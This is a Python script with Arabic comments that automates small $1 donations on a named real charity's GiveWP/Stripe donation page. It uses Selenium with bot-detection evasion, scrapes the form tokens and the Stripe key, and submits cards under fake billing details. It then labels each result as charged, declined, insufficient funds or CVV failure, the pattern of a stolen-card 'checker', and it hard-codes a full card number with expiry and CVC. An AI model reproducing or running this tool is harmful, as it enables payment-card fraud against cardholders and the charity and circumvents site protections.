import time
import re
import json
import random
import os
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def setup_selenium_driver(headless=True):
    """إعداد Selenium Chrome - الطريقة اللي كانت شغالة"""
    options = Options()
    
    if headless:
        options.add_argument('--headless=new')
    
    # ═══ Performance ═══
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')
    options.add_argument('--disable-setuid-sandbox')
    options.add_argument('--disable-software-rasterizer')
    options.add_argument('--window-size=1920,1080')
    options.add_argument('--log-level=3')
    
    # ═══ Anti-detection ═══
    options.add_argument('--disable-blink-features=AutomationControlled')
    options.add_argument('--disable-features=IsolateOrigins,site-per-process')
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option('useAutomationExtension', False)
    
    # ═══ User-Agent حقيقي ═══
    options.add_argument(
        'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
    )
    
    # ═══ Page Load Strategy ═══
    options.page_load_strategy = 'eager'
    
    # ═══ Cookies + Profile ═══
    prefs = {
        "profile.managed_default_content_settings.images": 2,
        "profile.default_content_setting_values.notifications": 2,
        "profile.default_content_settings.popups": 0,
        "credentials_enable_service": False,
        "profile.password_manager_enabled": False,
    }
    options.add_experimental_option("prefs", prefs)
    
    # ═══ Driver ═══
    driver = None
    
    # محاولة 1: System ChromeDriver
    try:
        if os.path.exists('/usr/bin/chromedriver'):
            print("✅ Using system chromedriver")
            service = Service('/usr/bin/chromedriver')
            if os.path.exists('/usr/bin/chromium'):
                options.binary_location = '/usr/bin/chromium'
                print("✅ Using system chromium")
            driver = webdriver.Chrome(service=service, options=options)
    except Exception as e:
        print(f"⚠️ System driver failed: {e}")
    
    # محاولة 2: webdriver-manager
    if driver is None:
        try:
            from webdriver_manager.chrome import ChromeDriverManager
            service = Service(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
            print("✅ Using webdriver-manager")
        except Exception as e:
            print(f"⚠️ webdriver-manager failed: {e}")
    
    # محاولة 3: Default
    if driver is None:
        driver = webdriver.Chrome(options=options)
        print("✅ Using default Chrome")
    
    # ═══ Anti-Detection Scripts ═══
    driver.execute_cdp_cmd('Network.setUserAgentOverride', {
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
    })
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.execute_script("Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})")
    driver.execute_script("Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})")
    
    driver.set_page_load_timeout(30)
    driver.set_script_timeout(30)
    driver.implicitly_wait(2)
    
    return driver


def check_givewp_stripe(url, card_number, exp_month, exp_year, cvc):
    """فحص GiveWP + Stripe"""
    print("=" * 60)
    print(f"🎯 Checking: {url}")
    print("=" * 60)
    
    driver = None
    try:
        # ═══ Setup Driver ═══
        print("🚀 Launching Chrome...")
        driver = setup_selenium_driver(headless=True)
        print("✅ Chrome launched")
        
        # ═══ Open Page ═══
        print(f"🌐 Opening: {url}")
        driver.get(url)
        
        # ═══ Smart Wait for Cloudflare ═══
        print("⏳ Waiting for page + Cloudflare...")
        
        max_wait = 30
        start_time = time.time()
        page_ready = False
        
        while time.time() - start_time < max_wait:
            try:
                html = driver.page_source
                html_lower = html.lower()
                
                # Check for Cloudflare Challenge
                if 'just a moment' in html_lower or 'checking your browser' in html_lower:
                    print("   ⚠️ Cloudflare challenge detected, waiting...")
                    time.sleep(3)
                    continue
                
                # Check for GiveWP form
                if 'give-form-id' in html or 'givewp' in html_lower:
                    page_ready = True
                    break
                
                # Check page length
                if len(html) > 5000:
                    page_ready = True
                    break
                
                time.sleep(1)
            except:
                time.sleep(1)
        
        # ═══ Final Check ═══
        current_url = driver.current_url
        title = driver.title
        html = driver.page_source
        
        print(f"📍 URL: {current_url}")
        print(f"📍 Title: {title}")
        print(f"📄 Source length: {len(html)}")
        
        # ═══ Wait for Cloudflare more if needed ═══
        html_lower = html.lower()
        if 'just a moment' in html_lower or 'checking your browser' in html_lower:
            print("⚠️ Cloudflare still active, waiting 20s more...")
            time.sleep(20)
            html = driver.page_source
            html_lower = html.lower()
            if 'just a moment' in html_lower:
                return "CLOUDFLARE_CHALLENGE"
        
        # ═══ Extract Form Data ═══
        form_id = None
        form_hash = None
        form_prefix = None
        stripe_key = None
        
        # طريقة 1: find_elements
        try:
            els = driver.find_elements(By.NAME, "give-form-id")
            if els:
                form_id = els[0].get_attribute("value")
        except:
            pass
        
        try:
            els = driver.find_elements(By.NAME, "give-form-hash")
            if els:
                form_hash = els[0].get_attribute("value")
        except:
            pass
        
        try:
            els = driver.find_elements(By.NAME, "give-form-id-prefix")
            if els:
                form_prefix = els[0].get_attribute("value")
        except:
            pass
        
        # طريقة 2: من HTML
        if not form_id:
            m = re.search(r'name="give-form-id"\s+value="(\d+)"', html)
            if m:
                form_id = m.group(1)
        
        if not form_hash:
            m = re.search(r'name="give-form-hash"\s+value="([a-f0-9]+)"', html)
            if m:
                form_hash = m.group(1)
        
        if not form_prefix:
            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
            if m:
                form_prefix = m.group(1)
        
        # Stripe Key
        m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
        if m:
            stripe_key = m.group(0)
        
        print(f"✅ Form ID: {form_id}")
        print(f"✅ Form Hash: {form_hash}")
        print(f"✅ Form Prefix: {form_prefix}")
        print(f"✅ Stripe Key: {stripe_key}")
        
        if not form_id or not form_hash:
            return f"MISSING_FORM_DATA (len={len(html)})"
        
        # ═══ Generate Stripe PM ═══
        print("💳 Generating Stripe Payment Method...")
        
        stripe_js = """
        var callback = arguments[arguments.length - 1];
        var stripeKey = arguments[0];
        var cardNum = arguments[1];
        var expM = arguments[2];
        var expY = arguments[3];
        var cvc = arguments[4];
        
        (async () => {
            try {
                if (typeof Stripe === 'undefined') {
                    await new Promise((resolve, reject) => {
                        const s = document.createElement('script');
                        s.src = 'https://js.stripe.com/v3/';
                        s.onload = resolve;
                        s.onerror = () => reject(new Error('Stripe.js load failed'));
                        document.head.appendChild(s);
                    });
                    await new Promise(r => setTimeout(r, 2000));
                }
                
                if (typeof Stripe === 'undefined') {
                    callback(JSON.stringify({error: 'Stripe.js not available'}));
                    return;
                }
                
                const stripe = Stripe(stripeKey);
                
                const result = await stripe.createPaymentMethod({
                    type: 'card',
                    card: {
                        number: cardNum,
                        exp_month: parseInt(expM),
                        exp_year: parseInt(expY),
                        cvc: cvc
                    },
                    billing_details: {
                        name: 'James Smith',
                        email: 'james.smith@gmail.com',
                        address: {
                            line1: '123 Main Street',
                            city: 'New York',
                            state: 'NY',
                            postal_code: '10001',
                            country: 'US'
                        }
                    }
                });
                
                if (result.error) {
                    callback(JSON.stringify({
                        error: result.error.message,
                        code: result.error.code,
                        decline_code: result.error.decline_code
                    }));
                } else {
                    callback(JSON.stringify({
                        pm_id: result.paymentMethod.id,
                        success: true
                    }));
                }
            } catch (e) {
                callback(JSON.stringify({error: 'Exception: ' + e.message}));
            }
        })();
        """
        
        try:
            result_raw = driver.execute_async_script(
                stripe_js,
                stripe_key,
                card_number,
                exp_month,
                exp_year,
                cvc
            )
            
            print(f"📥 Stripe: {result_raw[:300]}")
            
            pm_data = json.loads(result_raw)
            
            if 'error' in pm_data:
                error = pm_data['error']
                decline = pm_data.get('decline_code', '')
                code = pm_data.get('code', '')
                
                if decline:
                    return f"STRIPE_{decline.upper()}: {error[:100]}"
                if code:
                    return f"STRIPE_{code.upper()}: {error[:100]}"
                return f"STRIPE_ERROR: {error[:100]}"
            
            pm_id = pm_data.get('pm_id')
            print(f"✅ PM ID: {pm_id}")
            
            # ═══ Get Cookies ═══
            cookies = driver.get_cookies()
            print(f"✅ Got {len(cookies)} cookies")
            
            # ═══ POST Donation ═══
            print("💸 Submitting donation...")
            
            session = requests.Session()
            session.verify = False
            
            for c in cookies:
                session.cookies.set(c['name'], c['value'])
            
            donation_url = f'https://higherhopesdetroit.org/donation/?payment-mode=stripe&form-id={form_id}'
            
            data = {
                'give-honeypot': '',
                'give-form-id-prefix': form_prefix or f'{form_id}-1',
                'give-form-id': form_id,
                'give-form-title': 'Give a Donation',
                'give-current-url': 'https://higherhopesdetroit.org/donation/',
                'give-form-url': 'https://higherhopesdetroit.org/donation/',
                'give-form-minimum': '1.00',
                'give-form-maximum': '999999.99',
                'give-form-hash': form_hash,
                'give-price-id': 'custom',
                'give-amount': '1.00',
                'give_tributes_type': 'In Honor Of',
                'give_tributes_show_dedication': 'no',
                'give_tributes_radio_type': 'In Honor Of',
                'give_tributes_first_name': '',
                'give_tributes_last_name': '',
                'give_stripe_payment_method': pm_id,
                'payment-mode': 'stripe',
                'give_first': 'James',
                'give_last': 'Smith',
                'give_email': 'james.smith@gmail.com',
                'give_comment': 'Donation',
                'card_name': 'James Smith',
                'billing_country': 'US',
                'card_address': '123 Main Street',
                'card_address_2': '',
                'card_city': 'New York',
                'card_state': 'NY',
                'card_zip': '10001',
                'give_action': 'purchase',
                'give-gateway': 'stripe',
            }
            
            headers = {
                'authority': 'higherhopesdetroit.org',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://higherhopesdetroit.org',
                'referer': 'https://higherhopesdetroit.org/donation/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
            }
            
            response = session.post(donation_url, data=data, headers=headers, timeout=30)
            
            print(f"📥 POST: {response.status_code}, len={len(response.text)}")
            
            return parse_donation_response(response.text, response.status_code)
        
        except Exception as e:
            return f"Stripe JS Error: {str(e)[:100]}"
    
    except Exception as e:
        return f"Main Error: {str(e)[:150]}"
    
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


def parse_donation_response(text, status_code):
    """تحليل الرد"""
    text_lower = text.lower()
    
    live_map = {
        'insufficient_funds': 'INSUFFICIENT_FUNDS',
        'your card has insufficient funds': 'INSUFFICIENT_FUNDS',
        'card was declined': 'DECLINED',
        'your card was declined': 'DECLINED',
        'expired_card': 'EXPIRED_CARD',
        'your card has expired': 'EXPIRED_CARD',
        'suspected fraud': 'SUSPECTED_FRAUD',
        'incorrect_cvc': 'CVV_FAILURE',
        'security code is incorrect': 'CVV_FAILURE',
        'incorrect_number': 'INVALID_CARD_NUMBER',
        'card number is incorrect': 'INVALID_CARD_NUMBER',
        'do_not_honor': 'DO_NOT_HONOR',
        'processing_error': 'PROCESSING_ERROR',
        'thank you': 'CHARGE 1.0',
        'success': 'CHARGE 1.0',
    }
    
    for kw, resp in live_map.items():
        if kw in text_lower:
            return resp
    
    if text.strip().startswith('{'):
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                if data.get('success'):
                    return 'CHARGE 1.0'
                if 'data' in data and isinstance(data['data'], dict):
                    inner = data['data']
                    if 'error' in inner:
                        return f"GATEWAY_ERROR: {inner['error'][:100]}"
        except:
            pass
    
    matches = re.findall(r'"error[^"]*"\s*:\s*"([^"]+)"', text)
    if matches:
        return f"ERROR: {matches[0][:100]}"
    
    if status_code == 200:
        return f"UNKNOWN_200: {text[:200].strip()}"
    return f"HTTP_{status_code}"


if __name__ == '__main__':
    url = 'https://higherhopesdetroit.org/donation/'
    card = '5104040287872188|12|2027|951'
    
    parts = card.split('|')
    card_number = parts[0]
    exp_month = parts[1]
    exp_year = parts[2][-2:]
    cvc = parts[3]
    
    result = check_givewp_stripe(url, card_number, exp_month, exp_year, cvc)
    
    print("\n" + "=" * 60)
    print(f"📊 FINAL RESULT: {result}")
    print("=" * 60)
